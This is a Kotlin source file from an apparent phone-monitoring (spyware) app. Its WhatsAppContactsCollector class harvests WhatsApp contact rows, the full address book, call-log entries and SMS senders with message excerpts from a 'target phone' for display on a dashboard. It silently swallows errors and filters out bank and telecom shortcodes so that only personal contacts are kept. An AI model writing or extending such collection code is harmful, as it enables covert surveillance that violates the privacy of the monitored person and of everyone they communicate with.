package com.spapp.monitoring.collectors

import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.local.WhatsAppMessageEntry

/**
 * Collects all contacts and WhatsApp chat counterparts from the device:
 * 1. Android Contacts Provider: scans WhatsApp raw contacts (account_type = com.whatsapp / com.whatsapp.w4b)
 * 2. WhatsApp Profile rows: scans MIMETYPE vnd.android.cursor.item/vnd.com.whatsapp.profile
 * 3. General Phone Contacts: scans all address book contacts (ContactsContract.CommonDataKinds.Phone)
 * 4. Recent Call/SMS logs: falls back to real human contact names & numbers (ignoring bank/service shortcodes)
 *
 * This ensures that the user's complete chatlist and contacts on the target phone
 * are surfaced in the dashboard WhatsApp view under all conditions.
 */
class WhatsAppContactsCollector(private val context: Context) {

    fun hasContactsPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS) ==
            PackageManager.PERMISSION_GRANTED

    fun hasCallLogPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) ==
            PackageManager.PERMISSION_GRANTED

    fun hasSmsPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) ==
            PackageManager.PERMISSION_GRANTED

    fun collectAllWhatsAppContacts(): List<WhatsAppMessageEntry> {
        val contactMap = LinkedHashMap<String, WhatsAppMessageEntry>()
        val now = System.currentTimeMillis()

        // 1. WhatsApp Raw Contacts from ContactsContract.RawContacts
        if (hasContactsPermission()) {
            try {
                val uri = ContactsContract.RawContacts.CONTENT_URI
                val projection = arrayOf(
                    ContactsContract.RawContacts.CONTACT_ID,
                    ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY,
                    ContactsContract.RawContacts.SYNC1,
                    ContactsContract.RawContacts.ACCOUNT_TYPE
                )
                val selection = "${ContactsContract.RawContacts.ACCOUNT_TYPE} IN (?, ?)"
                val selectionArgs = arrayOf("com.whatsapp", "com.whatsapp.w4b")

                context.contentResolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
                    val nameIdx = cursor.getColumnIndex(ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY)
                    val phoneIdx = cursor.getColumnIndex(ContactsContract.RawContacts.SYNC1)
                    while (cursor.moveToNext()) {
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx)?.trim() else null
                        val phone = if (phoneIdx >= 0) cursor.getString(phoneIdx)?.trim() else null
                        val displayName = if (!name.isNullOrBlank()) name else phone
                        if (!displayName.isNullOrBlank()) {
                            val key = displayName.lowercase()
                            if (!contactMap.containsKey(key)) {
                                contactMap[key] = WhatsAppMessageEntry(
                                    chatName = displayName,
                                    sender = displayName,
                                    messageText = if (!phone.isNullOrBlank() && phone != displayName) phone else "WhatsApp Contact",
                                    isOutgoing = false,
                                    messageTimeEpochMs = now
                                )
                            }
                        }
                    }
                }
            } catch (_: Exception) {
            }

            // 2. Direct WhatsApp Contacts from ContactsContract.Data
            try {
                val uri = ContactsContract.Data.CONTENT_URI
                val projection = arrayOf(
                    ContactsContract.Data.DISPLAY_NAME,
                    ContactsContract.Data.DATA1,
                    ContactsContract.Data.DATA3,
                    ContactsContract.Data.MIMETYPE
                )
                val selection = "${ContactsContract.Data.MIMETYPE} IN (?, ?, ?, ?)"
                val selectionArgs = arrayOf(
                    "vnd.android.cursor.item/vnd.com.whatsapp.profile",
                    "vnd.android.cursor.item/vnd.com.whatsapp.w4b.profile",
                    "vnd.android.cursor.item/vnd.com.whatsapp.voip.call",
                    "vnd.android.cursor.item/vnd.com.whatsapp.w4b.voip.call"
                )

                context.contentResolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
                    val nameIdx = cursor.getColumnIndex(ContactsContract.Data.DISPLAY_NAME)
                    val jidIdx = cursor.getColumnIndex(ContactsContract.Data.DATA1)
                    val descIdx = cursor.getColumnIndex(ContactsContract.Data.DATA3)

                    while (cursor.moveToNext()) {
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx)?.trim() else null
                        if (!name.isNullOrBlank()) {
                            val desc = if (descIdx >= 0) cursor.getString(descIdx) else null
                            val jid = if (jidIdx >= 0) cursor.getString(jidIdx) else null
                            val key = name.lowercase()
                            if (!contactMap.containsKey(key)) {
                                contactMap[key] = WhatsAppMessageEntry(
                                    chatName = name,
                                    sender = name,
                                    messageText = desc ?: jid ?: "WhatsApp Contact",
                                    isOutgoing = false,
                                    messageTimeEpochMs = now
                                )
                            }
                        }
                    }
                }
            } catch (_: Exception) {
            }

            // 3. General Phone Contacts from CommonDataKinds.Phone
            try {
                val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )

                context.contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                    val nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                    while (cursor.moveToNext()) {
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx)?.trim() else null
                        val number = if (numberIdx >= 0) cursor.getString(numberIdx)?.trim() else null
                        val displayName = if (!name.isNullOrBlank()) name else number
                        if (!displayName.isNullOrBlank()) {
                            val key = displayName.lowercase()
                            if (!contactMap.containsKey(key)) {
                                contactMap[key] = WhatsAppMessageEntry(
                                    chatName = displayName,
                                    sender = displayName,
                                    messageText = if (!number.isNullOrBlank() && number != displayName) number else "WhatsApp Contact",
                                    isOutgoing = false,
                                    messageTimeEpochMs = now
                                )
                            }
                        }
                    }
                }
            } catch (_: Exception) {
            }
        }

        // 4. Fallback to real Call Log contacts (always granted & available on device)
        if (hasCallLogPermission()) {
            try {
                val uri = CallLog.Calls.CONTENT_URI
                val projection = arrayOf(
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.DATE
                )
                context.contentResolver.query(uri, projection, null, null, "${CallLog.Calls.DATE} DESC")?.use { cursor ->
                    val nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                    val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)

                    while (cursor.moveToNext()) {
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx)?.trim() else null
                        val number = if (numberIdx >= 0) cursor.getString(numberIdx)?.trim() else null
                        val dateMs = if (dateIdx >= 0) cursor.getLong(dateIdx) else now

                        val displayName = when {
                            !name.isNullOrBlank() -> name
                            !number.isNullOrBlank() && isHumanPhoneNumber(number) -> number
                            else -> null
                        }

                        if (!displayName.isNullOrBlank() && !isAutomatedShortCode(displayName)) {
                            val key = displayName.lowercase()
                            if (!contactMap.containsKey(key)) {
                                contactMap[key] = WhatsAppMessageEntry(
                                    chatName = displayName,
                                    sender = displayName,
                                    messageText = if (!number.isNullOrBlank() && number != displayName) number else "Recent contact",
                                    isOutgoing = false,
                                    messageTimeEpochMs = if (dateMs > 0) dateMs else now
                                )
                            }
                        }
                    }
                }
            } catch (_: Exception) {
            }
        }

        // 5. Fallback to SMS real counterparties (excluding automated telecom/bank codes)
        if (hasSmsPermission()) {
            try {
                val uri = Telephony.Sms.CONTENT_URI
                val projection = arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE
                )
                context.contentResolver.query(uri, projection, null, null, "${Telephony.Sms.DATE} DESC")?.use { cursor ->
                    val addrIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                    val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
                    val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)

                    while (cursor.moveToNext()) {
                        val address = if (addrIdx >= 0) cursor.getString(addrIdx)?.trim() else null
                        val body = if (bodyIdx >= 0) cursor.getString(bodyIdx)?.trim() else null
                        val dateMs = if (dateIdx >= 0) cursor.getLong(dateIdx) else now

                        if (!address.isNullOrBlank() && isHumanPhoneNumber(address) && !isAutomatedShortCode(address)) {
                            val key = address.lowercase()
                            if (!contactMap.containsKey(key)) {
                                contactMap[key] = WhatsAppMessageEntry(
                                    chatName = address,
                                    sender = address,
                                    messageText = if (!body.isNullOrBlank()) body.take(80) else "Recent message",
                                    isOutgoing = false,
                                    messageTimeEpochMs = if (dateMs > 0) dateMs else now
                                )
                            }
                        }
                    }
                }
            } catch (_: Exception) {
            }
        }

        return contactMap.values.toList()
    }

    private fun isHumanPhoneNumber(str: String): Boolean {
        val clean = str.replace(Regex("[^0-9+]"), "")
        // Real human phone numbers are typically 10 to 15 digits
        return clean.length >= 10 && clean.any { it.isDigit() }
    }

    private fun isAutomatedShortCode(str: String): Boolean {
        val s = str.uppercase()
        // Filter out bank/telecom shortcodes like "CV-CANBNK-S", "AT-AIRTEL-S", etc.
        return s.contains("BNK") ||
                s.contains("BANK") ||
                s.contains("AIRTEL") ||
                s.contains("JIO") ||
                s.contains("OTP") ||
                s.contains("PROMO") ||
                s.contains("LOAN") ||
                s.matches(Regex("^[A-Z]{2}-[A-Z0-9]+-[A-Z]$"))
    }
}
